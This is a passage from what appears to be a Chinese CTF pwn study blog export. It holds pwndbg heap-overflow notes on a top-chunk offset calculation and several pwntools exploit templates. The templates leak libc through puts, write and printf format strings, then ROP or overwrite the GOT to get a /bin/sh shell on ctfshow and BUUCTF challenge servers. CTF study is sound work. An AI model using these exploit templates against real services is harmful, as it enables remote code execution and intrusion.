<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/30gx 0x91fd290</span><br><span class="line">0x91fd290:	0x0000000000000000	0x0000000000000021  </span><br><span class="line">0x91fd2a0:	0x0000000000400857	0x0000000000400876</span><br><span class="line">0x91fd2b0:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x91fd2c0:	0x000a306b6e75686	0x0000000000000000  //chunk0</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; telescope 0x0400857</span><br><span class="line">00:0000│  0x400857 (hello_message) ◂— push rbp   //hello_message起始地址</span><br><span class="line">01:0008│  0x40085f (hello_message+8) ◂— or byte ptr [rax], al</span><br><span class="line">02:0010│  0x400867 (hello_message+16) ◂— lea rdi, [rip + 0x823]</span><br><span class="line">03:0018│  0x40086f (hello_message+24) ◂— pop rbp</span><br><span class="line">04:0020│  0x400877 (goodbye_message+1) ◂— mov rbp, rsp</span><br><span class="line">05:0028│  0x40087f (goodbye_message+9) ◂— add byte ptr [rax], al</span><br><span class="line">06:0030│  0x400887 (goodbye_message+17) ◂— pop rbp</span><br><span class="line">07:0038│  0x40088f (menu+6) ◂— cmp eax, 0x82d</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; telescope 0x400876</span><br><span class="line">00:0000│  0x400876 (goodbye_message) ◂— push rbp  //goodbye_message起始地址</span><br><span class="line">01:0008│  0x40087e (goodbye_message+8) ◂— or byte ptr [rax], al</span><br><span class="line">02:0010│  0x400886 (goodbye_message+16) ◂— nop </span><br><span class="line">03:0018│  0x40088e (menu+5) ◂— lea edi, [rip + 0x82d]</span><br><span class="line">04:0020│  0x400896 (menu+13) ◂— 0x83e3d8d48fffffe</span><br><span class="line">05:0028│  0x40089e (menu+21) ◂— add byte ptr [rax], al</span><br><span class="line">06:0030│  0x4008a6 (menu+29) ◂— lea edi, [rip + 0x815]</span><br><span class="line">07:0038│  0x4008ae (menu+37) ◂— 0x8433d8d48fffffe</span><br></pre></td></tr></table></figure>

<p>edit(0, len(payload), payload)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x91fd000</span><br><span class="line">Size: 0x290 (with flag bits: 0x291)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x91fd290</span><br><span class="line">Size: 0x20 (with flag bits: 0x21)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x91fd2b0</span><br><span class="line">Size: 0x40 (with flag bits: 0x41)</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE | IS_MMAPED | NON_MAIN_ARENA</span><br><span class="line">Addr: 0x91fd2f0</span><br><span class="line">Size: 0xfffffffffffffff8 (with flag bits: 0xffffffffffffffff)   //top_chunk的size改变了</span><br></pre></td></tr></table></figure>

<p>由于我的libc版本较高，检查到堆溢出可能就崩掉了就无法继续了。远程可以打通</p>
<p>这里我就接着解释一些数据怎么来的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x30:这个没什么要求换成其他数据也可以</span><br><span class="line">0x38: 0x91fd2f0 - 0x91fd2b0 = 0x40,0x40 - 0x16(chunk0的header) + 0x08(top的pre_size) = 0x30</span><br><span class="line">-(0x60 + 0x8 + 0xf):0x91fd2f0 - 0x91fd290 = 0x60，top和v4的header的距离 ，0x8 + 0xf和强制对齐有关</span><br><span class="line">0x10:v4[0]和v4[1]正好0x10,换成比0x10大的数据都可以</span><br></pre></td></tr></table></figure>

<p>强制对齐操作的公式是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nb = ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK</span><br></pre></td></tr></table></figure>

<ul>
<li><p>**<code>req</code>**：用户调用 <code>malloc(req)</code> 时申请的数据大小（即用户需要的内存字节数）。</p>
</li>
<li><p>**<code>SIZE_SZ</code>**：在 64 位系统中为 <code>0x8</code>（表示 <code>sizeof(size_t)</code>）。它常被理解为 chunk 头部（header）大小的一部分，但实际上，header 总大小为 <code>2 * SIZE_SZ = 0x10</code> 字节（包括 <code>prev_size</code> 和 <code>size</code> 字段）。</p>
</li>
<li><p>**<code>MALLOC_ALIGN_MASK</code>**：在 64 位系统中为 <code>0xf</code>（十六进制），对应内存对齐掩码。内存对齐要求通常是 16 字节（即 <code>MALLOC_ALIGN = 16</code>），所以掩码为 <code>16 - 1 = 15</code>（即 <code>0xf</code>）。</p>
</li>
<li><p>**<code>nb</code>**：输出的值，表示实际分配的 chunk 总大小（包括 header 和用户数据区域）。</p>
</li>
<li><p><code>offset = -0x77</code> 对应 <code>malloc</code> 参数为 <code>0xffffffffffffff89</code></p>
</li>
<li><p>对齐后实际分配大小：<code>(0xffffffffffffff89 + 8 + 15) &amp; ~15 = 0xffffffffffffffa0</code></p>
</li>
<li><p>使top chunk回退 <code>0x60</code> 字节</p>
</li>
</ul>
]]></content>
      <categories>
        <category>PWN</category>
        <category>总结</category>
        <category>heap</category>
      </categories>
  </entry>
  <entry>
    <title>libc泄露</title>
    <url>/2025/02/20/libc%E6%B3%84%E9%9C%B2/</url>
    <content><![CDATA[<h4 id="碰到一题学一题不断更新"><a href="#碰到一题学一题不断更新" class="headerlink" title="碰到一题学一题不断更新"></a>碰到一题学一题不断更新</h4><h1 id="libc泄露"><a href="#libc泄露" class="headerlink" title="libc泄露"></a>libc泄露</h1><ul>
<li><p><a href="#puts%E6%B3%84%E9%9C%B2">1.puts泄露</a></p>
<ul>
<li><p><a href="#puts(32%E4%BD%8D)">1.puts(32位)</a></p>
</li>
<li><p><a href="#puts(64%E4%BD%8D)">2.puts(64位)</a></p>
</li>
</ul>
</li>
<li><p><a href="#write%E6%B3%84%E9%9C%B2">2.write泄露</a></p>
<ul>
<li><a href="#write(32%E4%BD%8D)">1.write(32位)</a></li>
<li><a href="#write(64%E4%BD%8D)">2.write(64位)</a></li>
</ul>
</li>
<li><p><a href="#printf%E6%B3%84%E9%9C%B2(%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2)">3.printf泄露(格式化字符串)</a></p>
</li>
</ul>
<p>这里主要记录模版和相关例题，在没有直接给system(&#x2F;bin&#x2F;sh)的题目，并且有put,write等函数的时候可以考虑libc泄露</p>
<h2 id="puts泄露"><a href="#puts泄露" class="headerlink" title="puts泄露"></a>puts泄露</h2><h3 id="puts-32位"><a href="#puts-32位" class="headerlink" title="puts(32位)"></a>puts(32位)</h3><p>例题：<a href="https://ctf.show/">ctfshow</a>的pwn48</p>
<p>模板：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;, log_level = &#x27;debug&#x27;)</span></span><br><span class="line"><span class="comment">#r = process(&quot;./pwn48&quot;) #本地</span></span><br><span class="line">r = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>, <span class="number">28274</span>) <span class="comment">#远程</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn48&#x27;</span>)</span><br><span class="line">offset = <span class="number">0x6B</span> + <span class="number">0x4</span>  <span class="comment">#根据实际的偏移量填写</span></span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload = offset * <span class="string">b&#x27;a&#x27;</span> + p32(puts_plt) + p32(main_addr) + p32(puts_got)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">puts_addr = u32(r.recvuntil(<span class="string">&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_case = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = libc_case + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh = libc_case + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload = offset * <span class="string">b&#x27;a&#x27;</span> + p32(system_addr) + p32(<span class="number">0</span>) +   p32(bin_sh)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="puts-64位"><a href="#puts-64位" class="headerlink" title="puts(64位)"></a>puts(64位)</h3><p>例题：<a href="https://ctf.show/">ctfshow</a>的pwn，这题write和puts都有这里只用puts，write下面有别的例题</p>
<p>模板：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"><span class="comment">#r = process(&quot;./pwn46&quot;)</span></span><br><span class="line">r = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>, <span class="number">28220</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn46&quot;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">main = elf.sym[<span class="string">&quot;main&quot;</span>]</span><br><span class="line">offset = <span class="number">0x70</span>+<span class="number">8</span></span><br><span class="line">rdi_ret = <span class="number">0x0000000000400803</span></span><br><span class="line">ret = <span class="number">0x00000000004004fe</span></span><br><span class="line">payload1 = <span class="string">b&quot;a&quot;</span>*offset+p64(ret)+p64(rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">r.recvuntil(<span class="string">&quot;O.o?\n&quot;</span>)<span class="comment">#此题不可去</span></span><br><span class="line">r.sendline(payload1)</span><br><span class="line">puts_addr=u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment">#puts_addr=u64(r.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc=LibcSearcher(<span class="string">&quot;puts&quot;</span>,puts_addr)</span><br><span class="line">libc_base=puts_addr-libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line">system=libc_base+libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh=libc_base+libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(system))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(binsh))</span><br><span class="line">payload2=<span class="string">b&quot;a&quot;</span>*offset+p64(rdi_ret)+p64(binsh)+p64(system)</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>获取rdi,ret的地址可以通过ROPgadget</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary ./pwn46 --only &quot;pop|ret&quot;</span><br></pre></td></tr></table></figure>

<h2 id="write泄露"><a href="#write泄露" class="headerlink" title="write泄露"></a>write泄露</h2><h3 id="write-32位"><a href="#write-32位" class="headerlink" title="write(32位)"></a>write(32位)</h3><p>例题：<a href="https://buuoj.cn/">BUUCTF</a>的jarvisoj_level3</p>
<p>模板：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">27119</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line">main = elf.sym[<span class="string">&quot;main&quot;</span>]</span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">offset = <span class="number">0x88</span>+<span class="number">4</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*offset+p32(write_plt)+p32(main)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;Input:\n&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">write_addr=u32(r.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">libc_base=write_addr-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">sh=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*offset+p32(system)+p32(main)+p32(sh)</span><br><span class="line"><span class="comment">#r.recvuntil(&#x27;Input:\n&#x27;)</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>



<h3 id="write-64位"><a href="#write-64位" class="headerlink" title="write(64位)"></a>write(64位)</h3><p>例题：<a href="https://buuoj.cn/">BUUCTF</a>的jarvisoj_level3_x64</p>
<p>模板：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化目标：本地文件或远程服务</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./level3_x64&#x27;</span>)   <span class="comment"># 替换成你的二进制文件名</span></span><br><span class="line"><span class="comment">#r = process(&#x27;./level3_x64&#x27;) # 本地测试</span></span><br><span class="line">r = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">28476</span>) <span class="comment"># 远程连接</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取关键地址</span></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]  <span class="comment"># 用于重新触发漏洞（可选）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 寻找ROP Gadgets（需根据实际二进制用ROPgadget查找）</span></span><br><span class="line">pop_rdi = <span class="number">0x04006b3</span>          <span class="comment"># pop rdi; ret; （示例地址，需替换）</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x4006b1</span>      <span class="comment"># pop rsi; pop r15; ret; （示例地址，需替换）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算溢出偏移量（需通过调试确定）</span></span><br><span class="line">offset = <span class="number">0x80</span> + <span class="number">0x08</span>                  <span class="comment"># 替换成你的实际偏移量</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造泄露write@got的ROP链</span></span><br><span class="line"></span><br><span class="line">payload = flat(</span><br><span class="line">    [<span class="string">b&#x27;A&#x27;</span>] * offset,          <span class="comment"># 填充到返回地址</span></span><br><span class="line">    p64(pop_rdi),</span><br><span class="line">    p64(<span class="number">1</span>),                   <span class="comment"># fd=1(stdout)</span></span><br><span class="line">    p64(pop_rsi_r15),</span><br><span class="line">    p64(write_got),           <span class="comment"># 要泄露的地址（write@got）</span></span><br><span class="line">    p64(<span class="number">0</span>),                   <span class="comment"># 填充r15</span></span><br><span class="line">    p64(write_plt),           <span class="comment"># 调用write(1, write@got, 8)</span></span><br><span class="line">    p64(main_addr)            <span class="comment"># 返回main重新执行（可选）</span></span><br><span class="line">)</span><br><span class="line"><span class="comment">#等同于payload = b&#x27;A&#x27; * offset + p64(pop_rdi) + p64(1) + p64(pop_rsi_r15) +  p64(write_got) + p64(0) + p64(write_plt) + p64(main_addr)</span></span><br><span class="line"><span class="comment"># 发送Payload</span></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;Input:\n&#x27;</span>, payload)  <span class="comment"># 根据实际提示符修改</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收泄露的地址（注意接收长度）</span></span><br><span class="line"></span><br><span class="line">write_leak = u64(r.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">f&#x27;write@libc: <span class="subst">&#123;<span class="built_in">hex</span>(write_leak)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用libcsearch查找libc版本</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>, write_leak)</span><br><span class="line">libc_base = write_leak - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">f&#x27;libc base: <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&#x27;</span>)</span><br><span class="line">log.info(<span class="string">f&#x27;system@libc: <span class="subst">&#123;<span class="built_in">hex</span>(system_addr)&#125;</span>&#x27;</span>)</span><br><span class="line">log.info(<span class="string">f&#x27;/bin/sh@libc: <span class="subst">&#123;<span class="built_in">hex</span>(bin_sh_addr)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造后续攻击Payload（示例：ret2system）</span></span><br><span class="line">payload2 = flat(</span><br><span class="line">    <span class="string">b&#x27;A&#x27;</span> * offset,</span><br><span class="line">    p64(pop_rdi),</span><br><span class="line">    p64(bin_sh_addr),</span><br><span class="line">    p64(system_addr)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送第二个Payload</span></span><br><span class="line">r.sendline(payload2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获得shell</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>本题的rdx已被填写所以不用考虑，并且此题也找不到rdx</p>
<p><img src="/2025/02/20/libc%E6%B3%84%E9%9C%B2/1.png" alt="1"></p>
<p>如果有rdx的话</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = flat(</span><br><span class="line">    [<span class="string">b&#x27;A&#x27;</span>] * offset,          <span class="comment"># 填充到返回地址</span></span><br><span class="line">    p64(pop_rdi),</span><br><span class="line">    p64(<span class="number">1</span>),                   <span class="comment"># fd=1(stdout)</span></span><br><span class="line">    p64(pop_rsi_r15),</span><br><span class="line">    p64(write_got),           <span class="comment"># 要泄露的地址（write@got）</span></span><br><span class="line">    p64(<span class="number">0</span>),                   <span class="comment"># 填充r15</span></span><br><span class="line">    p64(pop_rdx),</span><br><span class="line">    p64(<span class="number">8</span>),                   <span class="comment"># 设置rdx为8，因为我们要读取8个字节(也不一定是8)</span></span><br><span class="line">    p64(write_plt),           <span class="comment"># 调用write(1, write@got, 8)</span></span><br><span class="line">    p64(main_addr)            <span class="comment"># 返回main重新执行（可选）</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h2 id="printf泄露-格式化字符串"><a href="#printf泄露-格式化字符串" class="headerlink" title="printf泄露(格式化字符串)"></a>printf泄露(格式化字符串)</h2><p>例题：<a href="https://ctf.show/">ctfshow</a>的pwn95</p>
<p>模板：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(arch = &quot;amd64&quot;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span></span><br><span class="line"><span class="comment">#context(arch = &quot;i386&quot;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span></span><br><span class="line"><span class="comment">#r = process(&quot;./pwn&quot;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28269</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#计算出的偏移量，根据实际情况调整</span></span><br><span class="line">offset = <span class="number">6</span></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">payload1 = p32(printf_got) + <span class="string">b&#x27;%6$s&#x27;</span></span><br><span class="line">r.send(payload1)</span><br><span class="line">printf_addr = u32(r.recvuntil(<span class="string">&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;printf&#x27;</span>,printf_addr)</span><br><span class="line">libc_base = printf_addr - libc.dump(<span class="string">&#x27;printf&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">payload = fmtstr_payload(offset,&#123;printf_got:system_addr&#125;)</span><br><span class="line"></span><br><span class="line">r.send(payload)</span><br><span class="line">r.send(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>例题：axb_2019_fmt64</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="comment">#sh=process(&quot;./pwn&quot;)</span></span><br><span class="line">sh=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">26272</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">printf_got =elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"><span class="comment">#payload1 = p32(puts_got)+b&#x27;%8$s&#x27;</span></span><br><span class="line">payload1 = <span class="string">b&#x27;%9$saaaa&#x27;</span>+p64(puts_got) <span class="comment">#%9$saaaa占了一个字符所以8 --&gt;9</span></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Please tell me:&#x27;</span>,payload1)</span><br><span class="line">puts_addr = u64(sh.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_add=&gt;&#x27;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc.address = puts_addr-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">printf_addr = libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;system_add=&gt;&#x27;</span>,<span class="built_in">hex</span>(system_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;printf_add=&gt;&#x27;</span>,<span class="built_in">hex</span>(printf_addr))</span><br><span class="line"><span class="comment">#这些地址只有部分不一样，那么只要覆盖这些不一样的即可了</span></span><br><span class="line">sysaddr1=system_addr&amp;<span class="number">0xff</span></span><br><span class="line">sysaddr2=(system_addr&amp;<span class="number">0xff00</span>)&gt;&gt;<span class="number">8</span></span><br><span class="line">sysaddr3=(system_addr&amp;<span class="number">0xff0000</span>)&gt;&gt;<span class="number">16</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys1=&gt;&#x27;</span>,<span class="built_in">hex</span>(sysaddr1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys2=&gt;&#x27;</span>,<span class="built_in">hex</span>(sysaddr2))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys3=&gt;&#x27;</span>,<span class="built_in">hex</span>(sysaddr3))</span><br><span class="line"><span class="comment">#9是输出的“Repeater:”的字符数</span></span><br><span class="line">sysaddr1_value = sysaddr1-<span class="number">9</span></span><br><span class="line">result = sysaddr2-sysaddr1</span><br><span class="line">sysaddr2_value=result <span class="keyword">if</span> result&gt;<span class="number">0</span> <span class="keyword">else</span> result+<span class="number">0x100</span></span><br><span class="line">result = sysaddr3-sysaddr2</span><br><span class="line">sysaddr3_value=result <span class="keyword">if</span> result&gt;<span class="number">0</span> <span class="keyword">else</span> result+<span class="number">0x100</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#这种和32位一样的写法会被00截断，所以需要把要覆盖的地址放到payload最后面</span></span><br><span class="line"><span class="comment"># payload2=b&#x27;aaaa&#x27;+p64(printf_got)+p64(printf_got+1)+p64(printf_got+2)#共22个字符</span></span><br><span class="line"><span class="comment"># payload2+=b&#x27;%&#x27;+bytes(str(sysaddr1_value),encoding=&#x27;utf-8&#x27;)+b&#x27;c&#x27;+b&#x27;%9$hhn&#x27;</span></span><br><span class="line"><span class="comment"># payload2+=b&#x27;%&#x27;+bytes(str(sysaddr2_value),encoding=&#x27;utf-8&#x27;)+b&#x27;c&#x27;+b&#x27;%10$hhn&#x27;</span></span><br><span class="line"><span class="comment"># payload2+=b&#x27;%&#x27;+bytes(str(sysaddr3_value),encoding=&#x27;utf-8&#x27;)+b&#x27;c&#x27;+b&#x27;%11$hhn&#x27;</span></span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(sysaddr1_value),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%13$hhn&#x27;</span></span><br><span class="line">payload2+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(sysaddr2_value),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%14$hhn&#x27;</span></span><br><span class="line">payload2+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(sysaddr3_value),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%15$hhn&#x27;</span></span><br><span class="line">payload2=payload2.ljust(<span class="number">40</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;len=&gt;&#x27;</span>,<span class="built_in">len</span>(payload2))</span><br><span class="line"><span class="built_in">print</span>(payload2)</span><br><span class="line">payload2+=p64(printf_got)+p64(printf_got+<span class="number">1</span>)+p64(printf_got+<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.sendline(payload2)</span><br><span class="line">payload3 = <span class="string">b&#x27;;/bin/sh&#x27;</span></span><br><span class="line">sh.sendline(payload3)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>PWN</category>
        <category>总结</category>
        <category>stack</category>
        <category>ret2libc</category>
      </categories>
  </entry>
  <entry>
    <title>heap的学习记录</title>
    <url>/2025/03/15/heap%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>现在开始学堆，听说heap比stack难多了，于是我想记录一下学习记录，然后再总结一下</p>
<ol>
<li><p>记录一下第一个写的heap题 [ZJCTF 2019]EasyHeap</p>
<p>什么都不懂，看wp，说在edit有一个堆溢出</p>
</li>
</ol>
<p><img src="/2025/03/15/heap%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/1.png" alt="1"></p>
<p>​     思路：</p>
<p><img src="/2025/03/15/heap%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/2.png" alt="2"></p>
<p>exp</p>
